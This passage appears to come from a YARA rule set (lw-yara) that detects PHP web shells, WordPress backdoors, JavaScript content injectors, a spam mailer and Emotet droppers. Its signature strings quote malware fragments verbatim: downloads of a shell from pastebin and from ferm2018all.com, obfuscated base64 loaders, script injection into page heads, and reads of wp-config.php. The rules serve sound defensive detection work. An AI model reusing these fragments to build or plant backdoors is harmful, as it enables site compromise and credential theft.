      $s9 = "a93a176df5bde;}function get_first_post_id(){global $wid727bb92f57c3951d;$rvu3f0f862b0c65d1b8=execute_query(\"SELECT id FROM \".$" ascii
      $s10 = "atch_exec_commands_for_conf(){if(array_key_exists('first',$_REQUEST)){get_posts_count();$gsc3caa85db42b2089e=get_first_post_id()" ascii
      $s11 = "<?php error_reporting(E_ERROR|E_WARNING|E_PARSE|E_COMPILE_ERROR);ini_set('display_errors','on');set_time_limit(0);check_commands" ascii
      $s12 = "nect_using_parse_config($rao5b668e57ec706744){global $wid727bb92f57c3951d;$ibua1a4b0b8357dda28=file_get_contents($rao5b668e57ec7" ascii
      $s13 = "c3951d=$bqo9b80b13ee7aa2867;$gkn531a93a176df5bde=db_connect(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME,'require');return $gkn531a93a176" ascii
      $s14 = "7016 password: $jwp8db64bce186cbad8 name: $lewfb507393460e685e method_name: $cluc49cf36844cf3448#\\n\";if(is_mysqli()){$rij1b9aa" ascii
      $s15 = "){print\"#Next id: $mrbefabc30264bfc793#\\n\";}else{print\"#No next id#\\n\";}}function check_commands(){if(array_key_exists('de" ascii
      $s16 = "nk')){print\"#loaded wp-load#\\n\";wp_load_insert_post();}else{print\"#Failed to load wp-load, trying to parse config directly#" ascii
      $s17 = "conf_path(){return get_file_path('wp-config.php');}function get_load_path(){return get_file_path('wp-load.php');}function get_fi" ascii
      $s18 = "a3ff8e5c2997);echo\"#Failed: $utx019af902730a88c4#\\n\";}}?>" fullword ascii
      $s19 = "ts_count(){global $wid727bb92f57c3951d;echo\"#wp_prefix: $wid727bb92f57c3951d#\\n\";$rvu3f0f862b0c65d1b8=execute_query(\"SELECT " ascii
      $s20 = "3['pinged'].\"','\".$axnab690da061c9b963['post_content_filtered'].\"')\");return $gkn531a93a176df5bde->$unn8916879d1cfb675c;}fun" ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 40KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule backdoor_wp_load {
   meta:
      description = "work1 - file backdoor_wp-load.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "527fdc5e4dc719fc97f61aa85b9edc33e90d9fd2ed3dbcda30ce25f4e1d5c908"
   strings:
      $s1 = "= str_replace('sx', '64', $ee); $algo = 'kolotyska'; $pass = \"Zgc5c4MXrL8kbQBSs88NKfKeflvUNPlfnyDNGK/X/wEfeQ==\";" fullword ascii
      $s2 = "if (fopen(\"$subdira/.$algo\", 'w')) { $ura = 1; $eb = \"$subdira/\"; $hdl = fopen(\"$subdira/.$algo\", 'w'); break; }" fullword ascii
      $s3 = "$data = file_get_contents($url);" fullword ascii
      $s4 = "if (fopen(\"$dira/.$algo\", 'w')) { $ura = 1; $eb = \"$dira/\"; $hdl = fopen(\"$dira/.$algo\", 'w'); break; }" fullword ascii
      $s5 = "if (!$ura && fopen(\".$algo\", 'w')) { $ura = 1; $eb = ''; $hdl = fopen(\".$algo\", 'w'); }" fullword ascii
      $s6 = "$ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa " ascii
      $s7 = "$reqw = $ay($ao($oa(\"$pass\"), 'wp_function'));" fullword ascii
      $s8 = "curl_setopt($ch, CURLOPT_HEADER, 0);" fullword ascii
      $s9 = "function get_data_ya($url) {" fullword ascii
      $s10 = "$ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa " ascii
      $s11 = "@ini_set('display_errors', '0');" fullword ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule backdoor_o9g {
   meta:
      description = "work1 - file backdoor_o9g.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "1bbe577ace2c701cad8617f94aac5723f929a21d9d703d64f108934dc97ccd8e"
   strings:
      $s1 = "9nWowmdq+1bZOfNUrtsNot+QHK8q+zHVFYDno6zPcrzO4arJ77kThps5PhFP9LR+mu/LaHuwz9aO3avxs2T3g65417hqc4XqbZGkrQf4LOgPYHNYDMZ8R0vU1TdoSyxA" ascii
      $s2 = "echo                                                                                                               " fullword ascii
      $s3 = "$__=                                                              'base64_decode'                           ;  " fullword ascii
      $s4 = "$__________=$__________________('$_',$______________);                                                                  " fullword ascii
      $s5 = "$_____='    b2JfZW5kX2NsZWFu';                                                                                          " fullword ascii
      $s6 = "5Offk7/++/dHXi+8e8+Lf8s7/PsX/P/L/8u6zUb+X798/rv975dznP79bBIpSv/79/8PuOX90w==';" fullword ascii
      $s7 = "A9tR6iNmkzWYva/COmN90AGzs1aSWGsxZyI5z1aieSx4hvEQ9/DCcy/9lNYLzwk+0H2WB1vO8UjoNsmjIbKHzAORmTRv4hJemX12FnQv0RKsZJ78zpSxG3k+bgV82fm7" ascii
      $s8 = "xwszuFc+tDGykz4bxpxP4O52ER5D0WSB6X7TtzieEcCzBZi7J4SFhXEcmdG7MU3ubQDezayFf0NbS32XzbEDvIs/Ed6S4BbnpBu/BAxQPeDnK7xvzHgxRrzAmF+g3zb+" ascii
      $s9 = "jL+I051je0GfQXkrpLJh9doPCzRUnrvo8JrjF2X/zmnjd+H6fKzkA/NmTV+vjtMCuaNOdBNkaaRfG6uF79qM1DHMZ7M43lf9bLyUvw6eUfYAT5CWTj8A2LWTY+uYioL9" ascii
      $s10 = "3o1+XWs64oKg4P94kI81r+WiJPGnQ97GQ/p0BW8KftY8gpwk+usd/uOCLeQurY3bemS9VPihrunVFf3e4GFVOuQNv1EGy5nPzOZUdjw8hqADHH3gS75EYogXvlavkLuW" ascii
      $s11 = "$____='b2JfZ2V0X2NvbnRlbnRz';                                                                               " fullword ascii
      $s12 = "$___();$__________($______($__($_))); $________=$____();" fullword ascii
   condition:
      ( uint16(0) == 0x3c0a and
         filesize < 70KB and
         ( 8 of them )
      ) or ( all of them )
}

rule content_injector_layer_4_deobfuscated {
   meta:
      description = "work1 - file content-injector_layer-4-deobfuscated.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "e2228fd80e18aa730f6180c3b70fde47218be6953b1bda1b42d8f8e0b0a7e380"
   strings:
      $s1 = "@setcookie($key, $value_and_ttl[0], time() + $value_and_ttl[0], \"/\", $_SERVER['HTTP_HOST']);" fullword ascii
      $s2 = "if (isset($content[\"options\"][\"type\"]) && $content[\"options\"][\"type\"]==\"inject\")" fullword ascii
      $s3 = "$content = str_replace(\"</head>\", $js_code . \"\\n\" . \"</head>\", $content);" fullword ascii
      $s4 = "foreach ($content[\"headers\"] as $key => $value)" fullword ascii
      $s5 = "$config = 'cTQ9JmsnKnF0KTprLjcoNTAtbihpMHR3Z35xNj4qMmV8cHJtMmFhfkVzaS4gNWYsem1sNShjZyF3PmpkeCotLzgFdixuLyVyJDZsKzZqKnptfiBye" fullword ascii
      $s6 = "$this->config_dict = @unserialize($this->_decrypt(TdsClient::b64d($this->config), \"tmnyrbtvchx5bny\"));" fullword ascii
      $s7 = "foreach (array_merge($_COOKIE, $_POST) as $data_key => $data)" fullword ascii
      $s8 = "foreach ($content[\"cookies\"] as $key => $value_and_ttl)" fullword ascii
      $s9 = "$GLOBALS['injectable_js_code'] = TdsClient::b64d($content[\"data\"]);" fullword ascii
      $s10 = "$context['http']['header'] = 'Content-type: application/x-www-form-urlencoded';" fullword ascii
      $s11 = "if (strpos(strtolower($content), \"</head>\") !== FALSE)" fullword ascii
      $s12 = "private function _http_query_native($url, $content)" fullword ascii
      $s13 = "private function _http_query_curl($url, $content)" fullword ascii
      $s14 = "return @file_get_contents($url, FALSE, $context);" fullword ascii
      $s15 = "public function try_process_check_request()" fullword ascii
      $s16 = "if ($client->try_process_check_request())" fullword ascii
      $s17 = "$query['u'] = @$_SERVER['HTTP_USER_AGENT'];" fullword ascii
      $s18 = "$query['p'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];" fullword ascii
      $s19 = "public function process_request()" fullword ascii
      $s20 = "$js_code = $GLOBALS['injectable_js_code'];" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

rule backdoor__51c46b7a {
   meta:
      description = "work1 - file backdoor_.51c46b7a.ico"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "205577f5011abfaf96d67e673023cb903ad8652b4d6f14ab8eb3fc4c232befd3"
   strings:
      $s1 = "$_cw847 = basename/*3*/(/*vts*/trim/*ic9j*/(/*9j*/preg_replace/*tb*/(/*3kqw*/rawurldecode/*ts1*/(/*sv4oc*/\"%2F%5C%28.%2A%24%2F" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( all of them )
      ) or ( all of them )
}

rule shell1_work1_exdir {
   meta:
      description = "work1 - file exdir.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "73910102658eb6291d811d64c3d83cbca948e06050b5bf6c4b8697a115efd6f9"
   strings:
      $x1 = "$shell = file_get_contents('https://pastebin.com/raw/hpqEekGT'); //" fullword ascii
      $s2 = "file_put_contents('wp-system.php',$shell);  //" fullword ascii
      $s3 = "$base = file_get_contents('base');" fullword ascii
      $s4 = "$admin = file_get_contents('admin');" fullword ascii
      $s5 = "$user = posix_getpwuid(posix_getuid());" fullword ascii
      $s6 = "$result=fopen('result.txt','w');" fullword ascii
      $s7 = "copy($file,($i+1).'.txt');" fullword ascii
      $s8 = "$find = 'wp-config.php';" fullword ascii
      $s9 = "$new='wp-system.php';" fullword ascii
      $s10 = "$result = findFilesFromDirectory($finalPath, $files, $find);" fullword ascii
      $s11 = "function findFilesFromDirectory($path, &$files, $find) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 3KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule infected_12_22_19_shell1_work1_ex {
   meta:
      description = "work1 - file ex.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "11cc1ce74623cca92b70a0992dfe908126e4a9a82243db110ea0f810ad474d82"
   strings:
      $x1 = "$shell = file_get_contents('https://pastebin.com/raw/hpqEekGT'); //" fullword ascii
      $s2 = "$base = file_get_contents('https://pastebin.com/raw/kHL0XPea');" fullword ascii
      $s3 = "file_put_contents('wp-system.php',$shell);  //" fullword ascii
      $s4 = "$user = posix_getpwuid(posix_getuid());" fullword ascii
      $s5 = "$result=fopen('result.txt','w');" fullword ascii
      $s6 = "copy($file,($i+1).'.txt');" fullword ascii
      $s7 = "$find = 'wp-config.php';" fullword ascii
      $s8 = "$new='wp-system.php';" fullword ascii
      $s9 = "$result = findFilesFromDirectory($finalPath, $files, $find);" fullword ascii
      $s10 = "function findFilesFromDirectory($path, &$files, $find) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 3KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule backdoor_mod_x {
   meta:
      description = "work1 - file backdoor_mod_x.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "2ebab963b4bdb879246e07c3fdcd5b4f1f78ca1a7cbd277d55f2732fbe4c9959"
   strings:
      $s1 = "$w = $v(\"/*iXedVoqe2988*/\", $xsqPYkUn667( jr_Uz($xsqPYkUn667($qosNeVMz3605), \"NSRvfrEi5875\")));" fullword ascii
      $s2 = "$XODAtKds5345 = \"8swkd9hm_1(na;xv07uoi4bg*63)eqz2f.jlp/rc5yt\";" fullword ascii
      $s3 = "FF2E1GSw6FwZUYHpBHj0AQwU1EBl2YER+DQI5PCUlCwFWCmJSBGFjQwVBAxp/Qlh+DQI5PCUjKRlvUVBSBBsAGQcqCB1lVU9FLD4hETYhByhXYFtPLQQqED9AfBxXVWF" ascii
      $s4 = "BBGJiBi0hB152X1x/GGIcJgVAE1lsCg5DL2E+Gi01dAJ7a1BeFmIcMDMeHy9gVERbHRUAIzM0fCBhCXlgBGJiBiobIQFUVXEBBColEQI6D1hva1wCDTQ5PARADw9WC2V" ascii
      $s5 = "dFD0EAz9BFxlXCgJTFAs6BgVBFxN+e1NdLWEcBgcmDwZvYFBbBQA5EQNAH1hXVXkFLwRrAy81AxNsCltFAz46GgMxIgJWe1sCBBsbTywLJl5vVQ5MBRAABjYmBF5/f1w" ascii
      $s6 = "ZFwQhQSUVLiN2aVtfFwscGi8xIR5vC3lNLBAxQCUVLiN2aVx/LT4ERgIqDxx8e2UFLxQ+DComcBBvYHpSHgAQNwU1IQ9WYGFZLT05GSw6FwZUYHpBHj4qBgQfNhp/cHk" ascii
      $s7 = "eLGA2DComABB7bHJbAhATGDVCfCN6ewZmBColESxCMTlmbFBBGAAxBS8xIQNWfFAHADoxBikFKiN/fw5CKhVrHAc1AxBWCmEFLSoTTy8xJgd6T1h/FD5rDzwlAwNUe1B" ascii
      $s8 = "ZLD42RgcxdRF6T0cMDTklAAVACxBUYHUFHjobQSUVKQVsCl9DBxAxTgc2AEJkCg5ALWFrBTwmMh9UfHIeHhQABgIbBwNXf3FPLSljHARAcFlvbwIFHjkqGwRBDx18fwJ" ascii
      $s9 = "/DQI+HwUfEwFUQkR+DQI5PCUlCwFWCmJSBGAQGAVBAxp/Qlh+DQI5PCUjKRBvYGUELT5mESw6FwZUYHpBHj0YGgULBFB8e2UFLxQ+DComcBFRb2FMKwA1HzNCEyRnbXl" ascii
      $s10 = "/BBsQGgUfdBN8fAdSAxchPSUjLiN2b21DLTo1HQcmdBNRcH1GFARmGSw0fDhhCXlgGSo2ASsLIQ1+awdNASoABjYYdR56QQdBBBQ5BiUVLiN2aVx/BBsQGgUfdBN8e0Q" ascii
      $s11 = "FKgsYAy81HwFXcHlZASQ9PCUqdSJ2aVtYKgRnHAI1KR9XUXVPFAQqGj9BFwJsUVBeFBQbBi86NiJ2aVx/LWA2BgI1CwZ+e2UFLxQ+DComcFlQYHVZBQI+QSUVLiN2aVt" ascii
      $s12 = "hGBUhGAU2AAdta1xSAjoTGD4xJhpXVmFGLBAqRgc1KRN5VXlaLARrHSocHwFXcGFZBQcmDzwqF1hWVQNSFD4UBQVAEF58UgMNLwRnAQIqFA5RcFtCFAdjRjwqLVl8fwJ" ascii
      $s13 = "SBxATES81KQR+e2VaFAQUHS0hB152UXZSBxATES8xBA58e3ZSBxATES8xBA58e3ZSBxATES8xBA58e3ZeLWAUBS8xcVB8e1N/Gj8cMDMeFA5mbQJgGioQESwLcQJRf3F" ascii
      $s14 = "/DQI+HwUfEwFUQkR+DQI5PCUlCwFWCmJSBGAQGAVBAxp/Qlh+DQI5PCUjKRBvYGUELT5mESw6FwZUYHpBHj0YGgULBFB8e2UFLxQ+DComcBFRb2FMKwA1HwVAExpvb3k" ascii
      $s15 = "/DQI5PCUjLgJtCXVlG2IAFCxBBBB/CQdSHgATGDNCEyRnbXlgBxA9ETQeDzlha3ZbAjoAEDM3fD1jfkRbLRcbGD4hcQd8fU9/GgY+Iy82CB58fQ5yHD8cMDAxBAd5UVB" ascii
      $s16 = "PKhsfGSxAdFxWC3FGFmE2GgI0fANXf1tZLD0AEAclcARXQVRFBQI9PCUhF1lvbwZCGWJiETYhBABhYFthLQQlES0xDBxXYFtPLQQqEDxAE1ltCnlGLwQEAwI0fBlXVW1" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( 8 of them )
      ) or ( all of them )
}

rule backdoor_unknown {
   meta:
      description = "work1 - file backdoor_unknown.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "291ff52840c65884ef97436f2ae472228f08240f0569f6bcc45d6e2b026b190f"
   strings:
      $x1 = "else $ttxt = get_data_yo(\"http://ferm2018all.com/lnk/gen/index.php?key=$tkey&g=$group&lang=$lang&page=$page&cldw=$cl" fullword ascii
      $x2 = "$desc = get_data_yo(\"http://ferm2018all.com//lnk/gen/desc.php?key=$tkey&desc=$group\");" fullword ascii
      $s3 = "$twork = file_get_contents('http://ferm2018all.com/lnk/up/sh.txt');" fullword ascii
      $s4 = "$clkeys = get_data_yo(\"http://ferm2018all.com/lnk/gen/keys/$kgroup.keys\");" fullword ascii
      $s5 = "$ll = get_data_yo(\"http://ferm2018all.com/lnk/tuktuk.php?d=$donor&cldw=$cldw&dgrp=$algo\");" fullword ascii
      $s6 = "$fbots = get_data_yo(\"http://ferm2018all.com/lnk/bots.dat\");" fullword ascii
      $s7 = "$my_content = str_replace('</head>', \"<meta name=\\\"description\\\" content=\\\"$desc\\\">" fullword ascii
      $s8 = "$gtxt = file_get_contents(\"{$eb}{$st}/$page.txt\");" fullword ascii
      $s9 = "if ($cldw) file_put_contents(\"{$eb}{$st}/cldwmap.txt\", $newcllink, FILE_APPEND);" fullword ascii
      $s10 = ">$rating-5</span> stars based on\\n<span itemprop=\\\"reviewCount\\\">$rcount</span> reviews\\n</div>\\n</div>\\n\";" fullword ascii
      $s11 = "else $ttxt = get_data_yo(\"http://ferm2018all.com/lnk/gen/index.php?key=$tkey&g=$group&lang=$lang&page=$page&cldw=$cldw&dd=$ddom" ascii
      $s12 = "$my_content = preg_replace('#<div class=\"post-content\">(.*)</div>#iUs', \"<div>\\n$txt\\n</div>\", $my_content, " fullword ascii
      $s13 = "if (file_put_contents(\"{$eb}xml.php\", $twork)) echo \"success!<br><a href=/{$eb}xml.php>go</a>\";" fullword ascii
      $s14 = "file_put_contents(\"{$eb}{$st}/$page.txt\", \"$title|$desc|$txt|$h1\");" fullword ascii
      $s15 = "$my_content = preg_replace('#<div class=\"post-content\">(.*)</div>#iUs', \"<div>\\n$txt\\n</div>\", $my_content, 1);" fullword ascii
      $s16 = "$my_content = preg_replace(\"#<meta name=[\\\"\\']{1}description(.*)\\>#iUs\", '', $my_content);" fullword ascii
      $s17 = "$my_content = preg_replace(\"#<meta name=[\\\"\\']{1}keywords(.*)\\>#iUs\", '', $my_content);" fullword ascii
      $s18 = "elseif (!preg_match('#<title>(.*)404(.*)#i', $my_content) && !preg_match('#<title>(.*)not found(.*)#i', $my_content)) {" fullword ascii
      $s19 = "$my_content = preg_replace('#<div id=\"entry-content\">(.*)</div>#iUs', \"<div>\\n$txt\\n</div>\", $my_content, 1)" fullword ascii
      $s20 = "$my_content = preg_replace('#<div id=\"main-content\">(.*)</div>#iUs', \"<div>\\n$txt\\n</div>\", $my_content, 1);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 50KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule mailer_wenche {
   meta:
      description = "work1 - file mailer_wenche.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "d70e877c611771ca1939f1863bb268abc96b364ee1024f0e9176e80ce4d5bfc9"
   strings:
      $s1 = "$jwgpxlzblkepa = base64_decode($_POST['tdluhqtnmzr']);  " fullword ascii
      $s2 = "$jewrqwbnlk = base64_decode($_POST['ylxqjqbcn']); " fullword ascii
      $s3 = "$fcublsqtpae = base64_decode($_POST['qqifquaqdzvp']);  " fullword ascii
      $s4 = "$xaouf = base64_decode($_POST['nrsf']); " fullword ascii
      $s5 = "$jfnbrsjfq = mail($jewrqwbnlk, $xaouf, $jwgpxlzblkepa, $fcublsqtpae);" fullword ascii
      $s6 = "if($jfnbrsjfq){echo 'vwkxlpc';} else {echo 'yfbhn : ' . $jfnbrsjfq;} " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule backdoor__1715ce0b {
   meta:
      description = "work1 - file backdoor_.1715ce0b.ico"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "14d58a0e5c09b4a0791f8ea400d62ca17456ebd55b5e999420ea6297bd670dc9"
   strings:
      $s1 = "$_whsb8 = basename/*vox*/(/*e0iq*/trim/*kh7m*/(/*7r*/preg_replace/*iac9*/(/*8b*/rawurldecode/*zad7*/(/*t7n2x*/\"%2F%5C%28.%2A%24" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( all of them )
      ) or ( all of them )
}

rule _home_hawk_infected_12_22_19_shell1_work1_34esd23 {
   meta:
      description = "work1 - file 34esd23.zip"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "8862eefed0ef325212a49f8617a396a7ef3b6e5d05cddeda998dbf1ae834be91"
   strings:
      $s1 = "papkaa17/g336803.txt" fullword ascii
      $s2 = "papkaa17/g757230.txt" fullword ascii
      $s3 = "papkaa17/g554038.txt" fullword ascii
      $s4 = "papkaa17/g864401.txt" fullword ascii
      $s5 = "papkaa17/g380118.txt" fullword ascii
      $s6 = "papkaa17/g200125.txt" fullword ascii
      $s7 = "papkaa17/g365278.txt" fullword ascii
      $s8 = "papkaa17/g895434.txt" fullword ascii
      $s9 = "papkaa17/g554066.txt" fullword ascii
      $s10 = "system.phpu" fullword ascii
      $s11 = "system.phpPK" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and
         filesize < 200KB and
         ( 8 of them )
      ) or ( all of them )
}

rule ailmentx {
   meta:
      description = "work1 - file ailmentx.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "324b93964b99f4c66253182bbbecb80b231743dbade2f3b361950248367ac065"
   strings:
      $s1 = "$ip=$_SERVER['REMOTE_ADDR'];if(array_key_exists('HTTP_X_FORWARDED_FOR',$_SERVER)){$ip=array_pop(explode(',',$_SERVER['HTTP_X_FO" fullword ascii
      $s2 = "$dr=gethostbyname(\"186.171.144.205.zen.spamhaus.org\");" fullword ascii
      $s3 = "$dr=gethostbyname($_SERVER['HTTP_HOST'].'.dbl.spamhaus.org');" fullword ascii
      $s4 = "$pri_addrs=array('10.0.0.0|10.255.255.255','172.16.0.0|172.31.255.255','192.168.0.0|192.168.255.255','169.254.0.0|169.254.255.2" fullword ascii
      $s5 = "if(a()){$u=\"https://google.com\";}else{$k=strlen($u);}" fullword ascii
      $s6 = "if(preg_match(\"/^127\\.0\\.1/\",$dr)){header(\"HTTP/1.1 404 Not Found\");exit;}" fullword ascii
      $s7 = "if(preg_match(\"/^127\\.0\\.0/\",$dr)){header(\"HTTP/1.1 404 Not Found\");exit;}" fullword ascii
      $s8 = "list($start,$end)=explode('|',$pri_addr);if($long_ip >= ip2long($start) && $long_ip <= ip2long($end)){return true;}" fullword ascii
      $s9 = "m(array(98,202,214,214,210,156,145,145,201,209,209,198,214,212,215,213,214,199,198,214,212,195,198,199,144,213,215));" fullword ascii
      $s10 = "header(\"Set-Cookie: bb4a88417b3d0170f=$k\");header(\"Location: $u\");" fullword ascii
      $s11 = "$ip=$_SERVER['REMOTE_ADDR'];if(array_key_exists('HTTP_X_FORWARDED_FOR',$_SERVER)){$ip=array_pop(explode(',',$_SERVER['HTTP_X_FOR" ascii
      $s12 = "$d=array_shift($a);$l=\"\";foreach($a as $b){$l.=chr($b-$d);} return $l;" fullword ascii
      $s13 = "55','127.0.0.0|127.255.255.255');" fullword ascii
      $s14 = "foreach($d as $p){$a=\"htac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod" ascii
      $s15 = "foreach($d as $p){$a=\"htac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 4KB and
         ( 8 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-10-11
   Identifier: PHP
   Reference: https://github.com/Hestat/lw-yara/
   Reference: https://github.com/NavyTitanium/Misc-Malwares/tree/master/PHP
*/

/* Rule Set ----------------------------------------------------------------- */

rule webshell2_index {
   meta:
      description = "PHP - file webshell2_index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "8c925e516cc6387a3642a878092a4537fde0e1fd2e8862bb51ea92c91b06a9a2"
   strings:
      $x1 = "$OOO__00O0_=\"kvlqst2onx-zpaf7edg5jcu6mr0b983iy_4h1w\";$O0O_0OO0__=$OOO__00O0_{4}.$OOO__00O0_{5}.$OOO__00O0_{25}.$OOO__00O0_{16}" ascii
      $s2 = "x5f\\x4f\\x4f\\x5f\\x5f\\x30\\x30\\x30\\x4f\"])?80:$OO00__O0O_[\"\\x4f\\x5f\\x4f\\x4f\\x5f\\x5f\\x30\\x30\\x30\\x4f\"];}$OOO00__" ascii
      $s3 = "_0=$OOO__00O0_{17}.$OOO__00O0_{13}.$OOO__00O0_{5}.$OOO__00O0_{16};header('Content-Type:text/html;charset=utf-8');${\"\\x47\\x4c" ascii
      $s4 = "0\\x4f\\x30\\x30\\x5f\\x5f\\x5f\\x4f\\x4f\"](\"/%host%/si\",$OO__O000_O,$O0O0_O0_O_);$O_O_00O0O_=${\"\\x47\\x4c\\x4f\\x42\\x41" ascii
      $s5 = "0\\x4f\\x30\\x30\\x5f\\x5f\\x5f\\x4f\\x4f\"](\"/%host%/si\",$OO__O000_O,$O_O_00O0O_);$OO_0_O0O_0=${\"\\x47\\x4c\\x4f\\x42\\x41" ascii
      $s6 = "__0.\\'|\\'.$OO00_O_O0_);$O0O0O_0_O_=${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x4f\\x30\\x4f\\x30\\x30\\x5f\\x5f\\x5f\\x4f" ascii
      $s7 = "}[\"\\x4f\\x5f\\x4f\\x4f\\x30\\x5f\\x5f\\x30\\x4f\\x30\"]($OO___O000O,CURLOPT_USERAGENT,\\'WHR\\');${\"\\x47\\x4c\\x4f\\x42\\x41" ascii
      $s8 = "f\"](\\'c0xOThTi0osdLtPS1wIA\\');unset($OOO00__O0_);$OO__O_0O00=\"GET $O0O0__OO_0 HTTP/$O__O00O0_O\\\\r\\\\n\".${\"\\x47\\x4c\\x" ascii
      $s9 = "O_00.\\'/\\'.$OOO_O__000)){$OOOO00_0__Array[] =$OOO_O__000;}}$OO_O__000O=\\'temp\\';$OOOO00_0__Array[] =$OO_O__000O;return $OOOO" ascii
      $s10 = "O_0O00_O_).\\'.txt\\';$O0O__0OO0_=${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x4f\\x5f\\x4f\\x5f\\x4f\\x4f\\x30\\x30\\x5f\\x3" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule emotet_3_index {
   meta:
      description = "PHP - file emotet-3_index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "d5ae3896c986f490edfe2010dad870dba0deb182166d1bd62261ff5ef2c6830d"
   strings:
      $x1 = "class Rst { const PLATFORM_UNKNOWN = 0; const PLATFORM_ANDROID = 1; const PLATFORM_APPLE = 2; const PLATFORM_LINUX = 3; const PL" ascii
      $s2 = "false) { $spc3aced = self::PLATFORM_APPLE; } } } } return $spc3aced; } public function execute() { $sp53dcff = '.' . sha1(basen" fullword ascii
      $s3 = "$_SERVER['QUERY_STRING']) { die($_SERVER['QUERY_STRING']); } $sp0b39f9 = new Rst(); echo $sp0b39f9->execute();" fullword ascii
      $s4 = "->contentName . '\"'); header('Content-Transfer-Encoding: binary'); return gzinflate(base64_decode($this->contentData)); } } if " ascii
      $s5 = "''; $spc3aced = self::PLATFORM_UNKNOWN; if (stripos($sp46a5c8, 'windows') !== false) { $spc3aced = self::PLATFORM_WINDOWS; } el" fullword ascii
      $s6 = "eDDs6EWzC6EeTG09OWxgTG1rcMD/estqlWAeM5SUTqLX7/pYT0hbzrSXtuq6VJfizrxbe++Bms0NElazTruNSapRkqAiTdWbdTYOYUn4otrAtvtpvNTNwLjxZKMBjJbt" ascii
      $s7 = "Dl4Y1urJxMdq064EVuVpmH3tzPPhWPC5zpF4aT1L2DPb2ScjjIEaD1zvmdY711swur9zBktUGA6EEiPqJ8fkT9aa2iAnH0+GjjXkqiigZ916KeyvPotrUnTMseXGZZyS" ascii
      $s8 = "yd/nKvB8cLgpHFQ0HR7L1nFzyXzi5/8LszL7dNpcgcsncKFYBn9imXwCTrH34Fx4bvje+gcsPDiJF/FJfTp0LkXji1j/sCK+kmRd6bT+Q//8KSUzAVXS+ydIEWKJr0oI" ascii
      $s9 = "zYj/Zzf7P0jtzf5/85/auxJ3j//+S/jbirWLjaEPLK27uOzvjfTPlfy/foN8gyBBOK7SirXvNVT+E98vw9/F939Lfovfr8Pv7zx2TbP4zso69zewa6RIEvD7J1uWPseH" ascii
      $s10 = "rwcfcua96REFBl30figUp4MbSKYhXry//7OF0flr8D6E3enPtiWIZREdnlZELBziVXxk9oDyO/XurW0Up0cLKzrPGmNGRqxe+PWaxzN5Xh2msrH5/CGwUVTkm2pQmmow" ascii
